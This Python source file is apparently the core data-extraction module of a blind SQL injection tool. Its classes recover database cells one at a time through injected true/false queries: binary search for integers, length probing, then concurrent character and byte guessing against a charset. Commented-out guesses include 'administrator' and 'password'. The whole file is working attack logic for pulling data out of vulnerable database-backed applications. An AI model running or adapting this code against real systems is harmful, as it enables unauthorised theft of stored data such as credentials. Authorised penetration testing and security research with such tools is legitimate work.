"""Fetchers are classes that are tasked to retrieve specific cells, as opposed to
methods, that fetch entire result sets. They can be thought of as subparts of injection
methods that allow to implement more complex, type specific logic.
"""

from __future__ import annotations

import asyncio
import functools
import statistics
from abc import ABC, abstractmethod
from asyncio import Task, TaskGroup
from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Any, ClassVar, Generic, NoReturn, TypeVar

from ending.ast import *
from ending.db.generic.fetcher import *
from ending.exception import InjectionError
from ending.struct.metadata import Context, VoidContext
from ending.struct.resultset import BytesPartialCell, PartialCell, StringPartialCell
from ending.util import logging, polytomy
from ending.util.misc import niter
from ending.util.typing import *

__all__ = [
    "BoolCellFetcher",
    "IntCellFetcher",
    "TextCellFetcher",
    "ByteSumTextCellFetcher",
    "BlobCellFetcher",
]

if TYPE_CHECKING:
    from ending.db.generic.method import Method, TestMethod


ST = TypeVar("ST", bound=NodeType)
PT = TypeVar("PT", bound=Cell)


CT = TypeVar("CT", str, bytes)
"""A composite type: a type that has a length and can be divided into parts."""
Candidate = TypeVar("Candidate")
"""Type of the candidates tested against the composite value part."""


class TaskedPartialCell(PartialCell[CT]):
    """Stores, in addition to parts of the partial cell, the tasks that retrieve these
    parts.
    """

    __slots__ = ["tasks"]

    def __init__(self, length: int) -> None:
        super().__init__(length)
        self.tasks: dict[int, Task] = {}

    def add_task(self, index: int, task: Task) -> None:
        self.tasks[index] = task
        task.set_name(index)
        task.add_done_callback(self.consume_task)

    def apply_prediction(self, value: PT, position: int = 0) -> None:
        """Applies a predicted value to the partial cell.

        The predicted bytes or characters are written into the cell, and any
        outstanding retrieval tasks for the corresponding positions are cancelled.
        """
        self._cancel_task_range(position, len(value))
        for i, item in enumerate(niter(value, 1), start=position):
            self.set(i, item)

    def _get_task_position(self, task: Task) -> int:
        """Retrieves the position of the part that `task` is supposed to retrieve."""
        return int(task.get_name())

    def consume_task(self, task: Task) -> None:
        """Adds the result to the elements, and removes the task."""
        position = self._get_task_position(task)
        self.tasks.pop(position, None)

        if not task.cancelled():
            self.set(position, task.result())

    def _cancel_task_range(self, start: int, length: int) -> None:
        """Cancels and deletes every task for positions between `start` and `start` +
        `length`.
        """
        for i in range(start, start + length):
            task = self.tasks.pop(i, None)
            if task:
                task.cancel()


class TaskedStringPartialCell(StringPartialCell, TaskedPartialCell[str]):
    pass


class TaskedBytesPartialCell(BytesPartialCell, TaskedPartialCell[bytes]):
    pass


@dataclass
class CellFetcher(Generic[PT]):
    """Tasked to fetch a cell."""

    method: Method
    log: logging.Logger = field(init=False)
    inject: InjectFor = field(init=False)

    def __post_init__(self):
        self.inject = self.method.inject
        self.log = logging.logger(__name__)

    async def fetch(self, expr: Node, ctx: Context) -> PT:
        """Fetches the value of the given cell `expr`, which has type `ST`."""

    def _log_inconsistent_confirmation(self, result: Any) -> None:
        """Stores a log message that indicates that the confirmation failed and we are
        retrying.
        """
        self.log.debug(f"Confirmation inconsistent, retrying ({result!r})")


@dataclass
class TypedCellFetcher(CellFetcher[PT], Generic[ST, PT]):
    """Tasked to retrieve cells of a specific type.

    It allows for complex type-specific logic. For instance, numbers can be stat'd in
    order to be guessed more easily, and strings can be divided into parts, which can be
    retrieved separately.
    """

    method: TestMethod

    async def fetch(self, expr: Node, ctx: Context) -> PT:
        """Fetches the value of the given cell `expr`, which has type `ST`."""


class BoolCellFetcher(TypedCellFetcher[BoolType, bool]):
    async def fetch(self, expr: Node, ctx: Context) -> int:
        if self.method.resilient:
            match expr:
                case Comparison(left, operator, right):
                    opposites = {
                        "<": ">=",
                        "<=": ">",
                        ">": "<=",
                        ">=": "<",
                        "=": "!=",
                        "!=": "=",
                    }
                    oexpr = Comparison(left, opposites[operator], right)
                case IsNull(node, negate):
                    oexpr = IsNull(node, negate=not negate)
                case _:
                    oexpr = Not(expr)

            while True:
                rtest, itest = await asyncio.gather(
                    self.inject(expr), self.inject(oexpr)
                )
                if rtest != itest:
                    return rtest

        return await self.inject(expr)


class IntCellFetcher(TypedCellFetcher[IntType, int]):
    """A fetcher for integer cells."""

    STATS_THRESHOLD = 5
    """Only use stats to predict the value if we know at least `STATS_THRESHOLD`
    previous values for the type.
    """

    async def fetch(self, expr: Node, ctx: Context) -> int:
        """Gets the value for an SQL expression of type `IntType`."""
        # Find out the [smin, smax] range the number is contained in ...

        type = expr.metadata.type

        # ... from stats, if enough is available
        if type.previous_values and len(type.previous_values) >= self.STATS_THRESHOLD:
            smin, smax = await self.fetch_range_stats(expr)
            # self.log.debug(f"{expr} is stat-bounded by [{smin}, {smax}]")
        # ... otherwise, from type
        else:
            smin = type.min
            smax = type.max

        MULTIPLIER = 10

        # If one of the bounds is not known, find it ourselves
        if smin is None:
            start = smax if smax is not None else MULTIPLIER
            offset = MULTIPLIER
            while await self.inject(expr < start - offset):
                offset *= MULTIPLIER
            smin = start - offset

        if smax is None:
            start = smin
            offset = MULTIPLIER * 2
            while await self.inject(expr > start + offset):
                offset *= MULTIPLIER
            smax = start + offset

        self.method.compiler.wrap(expr)
        self.log.debug(f"{expr} is bounded by [{smin}, {smax}]")

        # We now have a range (smin, smax): compute the number

        number = await self.fetch_from_range(expr, smin, smax)

        if self.method.resilient and await self.inject(expr != number):
            self._log_inconsistent_confirmation(number)
            return await self.fetch(expr, ctx=ctx)

        type.feedback(number)
        return number

    async def fetch_range_stats(self, expr: Node) -> Bounds:
        """Using values obtained from the feedback, try to determine the range in which
        the expression is. Returns an inclusive `[min, max]` range.
        """
        type = expr.metadata.type

        has_min = type.min is not None
        has_max = type.max is not None
        tmin = type.min
        tmax = type.max

        if has_min and tmin == tmax:
            return tmin, tmax

        # Note: stdev is the *sample* standard deviation
        stdev = statistics.stdev(type.previous_values)

        if stdev == 0:
            # Fast-path: if stdev is 0, try equality
            mean = int(statistics.mean(type.previous_values))
            if await self.inject(expr == mean):
                return mean, mean
            # Otherwise, we have no clue
            else:
                return tmin, tmax

        if has_min and has_max:
            left, mean, right = statistics.quantiles(
                [tmin, tmax] + type.previous_values, n=4, method="inclusive"
            )
        else:
            left, mean, right = statistics.quantiles(type.previous_values, n=4)

        mean = round(mean)
        left = round(left)
        right = round(right)

        # By definition, mean, left, and right are contained within [tmin, tmax]
        assert not has_max or (mean <= tmax and left <= tmax)
        assert not has_min or (mean >= tmin and right >= tmin)

        # Value is above the mean
        if (
            # No point comparing if the value cannot be higher
            # not (has_max and mean >= tmax)
            # and (
            # No point comparing if the value cannot be lower
            (has_min and mean <= tmin)
            or await self.inject(expr >= mean)
            # )
        ):
            if has_max and right >= tmax:
                return mean, tmax

            if mean <= right and await self.inject(expr <= right):
                return mean, right
            else:
                return right + 1, tmax
        # Value is under it
        else:
            if has_min and left <= tmin:
                return tmin, mean - 1

            if mean > left and await self.inject(expr >= left):
                return left, mean - 1
            else:
                return tmin, left

    async def fetch_from_range(self, expr: Query, smin: int, smax: int) -> int:
        """Uses dichotomy to find out the value of `expr`, assuming it is in the
        `[smin, smax]` range.
        """
        # smax is now exclusive
        # Note: if smin and smax are equal, no test is performed
        smax += 1

        while True:
            middle = (smax - smin) // 2
            if middle == 0:
                break
            middle = smin + middle
            if await self.inject(expr < middle):
                smax = middle
            else:
                smin = middle
        return smin


@dataclass
class CompositeCellFetcher(ABC, TypedCellFetcher[ST, PT], Generic[ST, PT, Candidate]):
    """Retrieves composite cells.

    Composite cells have a length and can be divided in multiple smaller parts. This is
    the case of `TextType` and `BlobType` nodes.

    The object first obtains the length of the value, and then fetches its parts
    independently using polytomy. The parts are then merged together.

    The class allows to fetch text and blob nodes using a similar algorithm, but
    allowing for a few differences.
    """

    NB_BEFORE_PREDICT = 2
    """Number of parts to obtain before starting to guess."""
    MAX_CONCURRENT_TASKS = 2
    """Max number of concurrently started tasks."""
    PartialCell: ClassVar[PartialCell]
    """Partial cell class."""

    method: TestMethod
    """Parent method."""

    def __post_init__(self):
        super().__post_init__()
        self._list_cache = {}
        """A cache to store the nodes that stores lists of candidates."""

    async def predict(self, query: Query, partial: PartialCell, ctx: Context) -> None:
        potential_predicts = [
            # "administrator",
            # "users",
            # "pablo",
            # "password",
            # "8d3533d75ae2c3966d7e0d4fcc69216b",
        ]

        for potential in potential_predicts:
            if len(partial.parts) >= 3 and partial.matches(potential):
                if await self.inject(
                    self.get_part(query, 0, len(potential)) == potential
                ):
                    partial.apply_prediction(potential)

    def create_partial(self, length: int) -> PartialCell:
        return self.PartialCell(length)

    async def predictor(self, query: Query, partial: PartialCell, ctx: Context) -> None:
        """Runs in parallel with the others and tries to predict parts of the result in
        order to speed up the process.
        """
        nb_done_tasks = 0

        # Every time at least `NB_BEFORE_PREDICT` tasks are done, start `predict()` to
        # try and see if part of the cell can get predicted
        while not partial.done():
            done, _ = await asyncio.wait(
                partial.tasks.values(), return_when=asyncio.FIRST_COMPLETED
            )

            nb_done_tasks += len(done)
            if nb_done_tasks > self.NB_BEFORE_PREDICT:
                nb_done_tasks -= self.NB_BEFORE_PREDICT
                await self.predict(query, partial, ctx=ctx)

    async def fetch(self, query: Query, ctx: Context) -> CT:
        """Gets the value of `query` by fetching its length, and then its parts."""

        candidates = await self.get_candidates(query)

        # Find out length, then fetch parts one by one

        length = await self._synced_fetch_length(query, ctx=ctx)
        partial = self.create_partial(length)
        ctx.notify("partial", partial)

        # Unfortunate naming clash
        notify_partial = functools.partial(ctx.notify, "partial", partial)

        # Create a task for each part of the cell, at most MAX_CONCURRENT_TASKS at a
        # time, and run predictor in parallel
        try:
            async with TaskGroup() as tg:
                tg.create_task(self.predictor(query, partial, ctx=ctx))

                for p in range(length):
                    if p in partial.parts:
                        continue
                    part_query = self.get_part(query, p, 1)
                    task = self.fetch_part(
                        part_query, candidates, ctx.with_(position=p)
                    )
                    task = tg.create_task(task)
                    partial.add_task(p, task)
                    task.add_done_callback(notify_partial)

                    # Wait for some tasks to end before going further
                    if len(partial.tasks) > self.MAX_CONCURRENT_TASKS:
                        await asyncio.wait(
                            partial.tasks.values(), return_when=asyncio.FIRST_COMPLETED
                        )

        # TODO Handle properly
        except ExceptionGroup as eg:
            raise eg.exceptions[0]

        return partial.get()

    @abstractmethod
    async def get_candidates(self, expr: Node) -> tuple[Candidate]:
        """A list of candidate values for each part."""

    @abstractmethod
    async def fetch_length(self, expr: Node, ctx: Context) -> int:
        """Obtains the length of a composite expression."""

    @abstractmethod
    def cast_part(self, result: Any) -> CT:
        """Converts the result of the polytomy into a proper value."""

    @abstractmethod
    def get_part(self, expr: Node, position: int, length: int) -> Node:
        """Returns an SQL expression that results in a subpart of the expression at
        offset `position` and of length `length`.
        """

    async def fetch_part(
        self, node: Node, candidates: tuple[Candidate], ctx: Context
    ) -> CT:
        """Obtains the value of a composite part."""
        check = functools.partial(self.fetch_part_is_in, node)
        resilient = self.method.resilient

        try:
            result = await polytomy.run(candidates, ctx.data["nb_sections"], check)
        except polytomy.PolytomyNotInSetError:
            result = None
        except polytomy.PolytomyNotSingletonError:
            if not resilient:
                raise
            return await self.fetch_part(node, candidates, ctx=ctx)

        # Make sure that the result is correct

        if resilient:
            if result is not None:
                test = await check((result,), negate=True)
            else:
                test = not await check(candidates, negate=True)

            if test:
                self._log_inconsistent_confirmation(result)
                return await self.fetch_part(node, candidates, ctx=ctx)

        # It is! Return the result, a placeholder, or raise

        if result is not None:
            return self.cast_part(result)

        return self.get_error_part(node)

    @abstractmethod
    def get_error_part(self, node: Node) -> CT | NoReturn:
        """Called when a part was not found. Returns a wildcard or raises an exception."""

    def _get_list_of_candidates(self, candidates: frozenset[Candidate]) -> List[Value]:
        """Returns a List AST node that contains `candidates`.

        The `List(candidates)` node will be created many, many times. Instead of
        recompiling it every time, we cache it, saving lots of time.
        """
        if candidates not in self._list_cache:
            lst = self._list_cache[candidates] = List[Value](candidates)
            return lst

        return self._list_cache[candidates]

    @abstractmethod
    async def fetch_part_is_in(
        self, expression: Node, candidates: frozenset[Candidate], negate: bool = False
    ) -> bool:
        """Returns `True` if the value of `expression` is within `candidates`, `False`
        otherwise. If `negate` is set, returns the opposite.
        """
        candidates = self._get_list_of_candidates(candidates)
        payload = expression.is_in(candidates, negate=negate)
        return await self.inject(payload)

    async def _synced_fetch_length(self, expr: Node, ctx: Context) -> int:
        """Wrapper for `TestMethod.fetch_composite_length` that assures concurrency,
        feedback and logging.
        """
        length = await self.fetch_length(expr, ctx=ctx)
        ctx.notify("length", length)
        self.log.debug(f"Length[{expr}] -> {length}")
        return length


@dataclass
class BaseCompositeCellFetcher(Generic[PT, CT], CompositeCellFetcher[PT, CT, int]):
    """A composite fetcher that works in most cases, using `Substring` to get part of a
    cell, and `Ord` to convert it to an integer.
    """

    async def fetch_length(self, expr: Node, ctx: Context) -> int:
        return await self.method.fetch_int(Length(expr), ctx=VoidContext())

    def get_part(self, expr: Node, position: int, length: int) -> Node:
        return Substring(expr, position, length)

    async def fetch_part_is_in(
        self, expression: Node, candidates: frozenset[int], negate: bool = False
    ) -> bool:
        candidates = self._get_list_of_candidates(candidates)
        payload = Ord(expression).is_in(candidates, negate=negate)
        return await self.inject(payload)


@dataclass
class TextCellFetcher(BaseCompositeCellFetcher[TextType, str]):
    """Fetches a node of type `TextType`."""

    PartialCell = TaskedStringPartialCell

    async def get_candidates(self, expr: Node) -> tuple[int]:
        return tuple(ord(c) for c in expr.metadata.type.charset)

    def cast_part(self, result: int) -> str:
        """Converts the result of the polytomy into a character."""
        return chr(result)

    def get_error_part(self, node: Node) -> CT | NoReturn:
        if (wc := self.method.wildcard) is not None:
            return wc

        raise InjectionError(
            "Character is not in charset",
            payload=self.method.compiler.wrap(node),
        ) from None


@dataclass
class ByteSumTextCellFetcher(TextCellFetcher):
    """This class converts character candidates into an integer that is equivalent to
    the multi-byte sequence interpreted as little-endian.

    The ORD() functions of both MySQL and Oracle use this representation.

    For instance, 'é' is `C3 A9`, and 0xC3 * 0x100 + 0xA9 is 50089.
    """

    async def get_candidates(self, expr: Node) -> tuple[int]:
        return tuple(
            int.from_bytes(c.encode(), "big") for c in expr.metadata.type.charset
        )

    def cast_part(self, result: int) -> str:
        """Converts the result of the polytomy into a character."""
        return result.to_bytes(4, "big").lstrip(b"\x00").decode()


@dataclass
class BlobCellFetcher(BaseCompositeCellFetcher[BlobType, bytes]):
    """Fetches a node of type `BlobType`."""

    PartialCell = TaskedBytesPartialCell

    async def get_candidates(self, expr: Node) -> tuple[int]:
        return tuple(expr.metadata.type.byteset)

    def cast_part(self, result: int) -> bytes:
        """Converts the result of the polytomy into a byte."""
        return bytes((result,))

    def get_error_part(self, node: Node) -> CT | NoReturn:
        if (wc := self.method.wildcard) is not None:
            return wc.encode()

        raise InjectionError(
            "Byte is not in byteset",
            payload=self.method.compiler.wrap(node),
        ) from None
